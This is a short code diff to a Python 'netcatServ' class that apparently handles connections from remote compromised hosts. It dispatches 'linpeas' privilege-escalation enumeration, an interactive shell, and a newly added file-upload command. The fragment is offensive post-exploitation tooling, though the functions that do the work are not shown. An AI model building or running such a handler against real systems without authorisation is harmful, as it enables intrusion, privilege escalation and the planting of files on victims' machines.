@@ -97,10 +97,18 @@ class netcatServ(object):
                     if 'help' in command:
                         Help.usageOn()
                     elif command == "linpeas":
+                        print(conn)
                         Rhost.linpeas(conn)
                     elif command == "shell":
                         Rhost.shell(conn)
                         conn.recv(self.bufferSize).decode()
+                    elif "upload " in command:
+                        param = command.split(" ")
+                        param = param[1:]
+                        try:
+                            Rhost.upload(conn,param[0],param[1])
+                        except IndexError:
+                            print("Error ! Missing one argument !")
                     elif command == "exit":
                         local = False
                     elif command == "clear":
